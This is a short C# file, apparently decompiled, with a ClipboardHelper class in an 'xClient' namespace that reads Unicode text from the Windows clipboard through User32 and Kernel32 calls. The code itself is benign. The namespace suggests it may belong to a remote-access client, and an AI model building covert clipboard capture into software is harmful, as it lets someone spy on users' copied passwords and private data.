using System;
using System.Runtime.InteropServices;
using System.Text;

namespace xClient;

public static class ClipboardHelper
{
	private const uint CF_UNICODETEXT = 13u;

	[DllImport("User32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsClipboardFormatAvailable(uint format);

	[DllImport("User32.dll", SetLastError = true)]
	private static extern IntPtr GetClipboardData(uint uFormat);

	[DllImport("User32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool OpenClipboard(IntPtr hWndNewOwner);

	[DllImport("User32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseClipboard();

	[DllImport("Kernel32.dll", SetLastError = true)]
	private static extern IntPtr GlobalLock(IntPtr hMem);

	[DllImport("Kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GlobalUnlock(IntPtr hMem);

	[DllImport("Kernel32.dll", SetLastError = true)]
	private static extern int GlobalSize(IntPtr hMem);

	public static string GetText()
	{
		if (!IsClipboardFormatAvailable(13u))
		{
			return null;
		}
		try
		{
			if (!OpenClipboard(IntPtr.Zero))
			{
				return null;
			}
			IntPtr clipboardData = GetClipboardData(13u);
			if (!(clipboardData == IntPtr.Zero))
			{
				IntPtr intPtr = IntPtr.Zero;
				try
				{
					intPtr = GlobalLock(clipboardData);
					if (intPtr == IntPtr.Zero)
					{
						return null;
					}
					int num = GlobalSize(clipboardData);
					byte[] array = new byte[num];
					Marshal.Copy(intPtr, array, 0, num);
					return Encoding.Unicode.GetString(array).TrimEnd(new char[1]);
				}
				finally
				{
					if (intPtr != IntPtr.Zero)
					{
						GlobalUnlock(clipboardData);
					}
				}
			}
			return null;
		}
		finally
		{
			CloseClipboard();
		}
	}
}
